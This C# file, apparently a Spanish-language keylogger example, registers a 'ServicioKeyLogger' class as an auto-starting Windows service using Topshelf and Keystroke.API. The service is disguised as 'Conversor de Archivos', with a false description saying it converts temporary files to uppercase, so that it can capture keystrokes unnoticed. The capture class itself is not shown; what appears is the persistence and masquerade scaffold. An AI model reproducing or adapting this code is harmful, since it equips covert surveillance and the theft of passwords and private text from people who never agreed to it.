using Keystroke.API;
using Keystroke.API.CallbackObjects;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Topshelf;

namespace KeyLoggerExample
{
    class Program
    {
        static void Main(string[] args)
        {
            // Install-Package KeystrokeAPI
            // Añadir Referencia de System.Windows.Forms 
            HostFactory.Run(configuracionDelServicio =>
            {
                configuracionDelServicio.UseNLog();
                configuracionDelServicio.Service<ServicioKeyLogger>
                (
                    instanciaDelServicio =>
                    {
                        instanciaDelServicio.ConstructUsing(() => new ServicioKeyLogger());
                        instanciaDelServicio.WhenStarted(servicioEnEjecucion => servicioEnEjecucion.Comenzar());
                        instanciaDelServicio.WhenStopped(servicioEnEjecucion => servicioEnEjecucion.Detenerse());
                    }
                );
                configuracionDelServicio.StartAutomatically();
                configuracionDelServicio.SetDisplayName("Conversor de Archivos");
                configuracionDelServicio.SetDescription("Convierte los archivos en la carpeta temporal a mayusculas");
                configuracionDelServicio.SetServiceName("ConversorDeArchivos");
            });
        }

        
    }
}
